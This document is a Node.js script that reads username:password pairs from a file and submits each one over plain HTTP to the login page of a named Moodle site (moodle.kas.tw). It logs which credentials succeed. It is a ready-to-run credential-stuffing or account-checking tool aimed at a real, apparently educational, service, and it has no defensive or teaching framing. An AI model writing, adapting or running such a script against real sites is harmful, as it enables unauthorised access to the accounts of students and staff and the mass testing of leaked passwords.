var querystring = require('querystring');
var http = require('http');
var fs = require("fs"),
    filename = "account.txt",
    encode = "utf8";


//================================================================================



 
fs.readFile(filename, encode, function(err, file) {
  if(err){
    console.log('檔案讀取錯誤。');
  }else{
    var username = [];
    var password = [];

    var temp = file.split("\n");
    for (var k = temp.length - 1; k >= 0; k--) {
      var temp2 = temp[k].split(":");
      username.push(temp2[0]);
      password.push(temp2[1]);
    };

    for (var s = username.length - 1; s >= 0; s--) {
      var usert = username[s];
      var passt = password[s];
      verify(usert,passt,s)
    };
  }
});





//================================================================================


function verify(u,p,s){
  var post_data = querystring.stringify({
    'username' : u,
    'password' : p
  });

  var post_options = {
    host: 'moodle.kas.tw',
    port: '80',
    path: '/login/index.php',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': post_data.length
    }
  };

  var post_req = http.request(post_options, function(res) {
    res.setEncoding('utf8');
    var data = "";
    res.on('data', function (chunk) {
      data += chunk;
    });
    res.on("end", function() {
      var match = data.match(/testsession=\d\d\d/);
      if (match !== null){
        console.log(s + " : " + u + " : " + p + " : Sucessed");
      }else{
        console.log(s + " : " + u + " : " + p + " : Failed or Parent account");
      }
    });
  });

  post_req.write(post_data);
  post_req.end();
}

